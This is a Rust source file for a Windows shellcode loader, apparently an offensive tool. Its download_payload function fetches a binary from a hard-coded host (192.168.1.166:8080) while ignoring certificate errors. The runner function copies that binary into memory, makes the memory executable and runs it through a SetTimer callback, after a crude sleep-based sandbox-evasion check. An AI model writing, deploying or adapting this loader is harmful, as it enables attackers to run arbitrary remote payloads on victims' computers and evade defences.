use std::thread::sleep;
use std::time::{
    Duration,
    Instant
};
use core::ffi::c_void;
use windows::Win32::System::Memory::{
    VirtualAlloc,
    VirtualProtect,
    VIRTUAL_ALLOCATION_TYPE,
    PAGE_PROTECTION_FLAGS
};
use windows::Win32::UI::WindowsAndMessaging::{
    SetTimer,
    GetMessageW,
    DispatchMessageW,
    MSG
};
use windows::Win32::Foundation::{
    //HANDLE,
    HWND,
    //LPARAM,
    //BOOL
};
use std::{
    self,
    ptr,
};
use reqwest;

fn countermeasures() {
    let now = Instant::now();
    sleep(Duration::from_secs(5));
    if now.elapsed().as_secs() < 5 {
        return;
    }
}

fn download_payload() -> Vec<u8> {                                                                                                 
    let url = "http://192.168.1.166:8080/out.bin";
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let binary = client.get(url).send().unwrap().bytes().unwrap();
    binary.to_vec()
}

pub fn runner() {
    countermeasures();

    let shellcode = download_payload();

    unsafe {
        let addr = VirtualAlloc(
            Some(ptr::null_mut()),
            shellcode.len().try_into().unwrap(), // Buffer length must fit into a usize
            VIRTUAL_ALLOCATION_TYPE(0x3000),
            PAGE_PROTECTION_FLAGS(0x04)
        );

        std::ptr::copy(shellcode.as_ptr() as _, addr, shellcode.len());

        let mut ppf = PAGE_PROTECTION_FLAGS(0x0);
        let ppf_ptr = &mut ppf as *mut PAGE_PROTECTION_FLAGS;
        let ptr = addr as *const c_void;
        VirtualProtect(
            ptr,
            shellcode.len(),
            PAGE_PROTECTION_FLAGS(0x20),
            ppf_ptr 
        );

        let exec: extern "system" fn(HWND, u32, usize, u32) = { std::mem::transmute(addr) };

        SetTimer(HWND(0), 0, 0, Some(exec));

        let mut msg: MSG = Default::default();
        let msgptr = &mut msg as *mut MSG;
        GetMessageW(msgptr , HWND(0), 0, 0);
        let msgptr = &msg as *const MSG;
        DispatchMessageW(msgptr);
    }
}
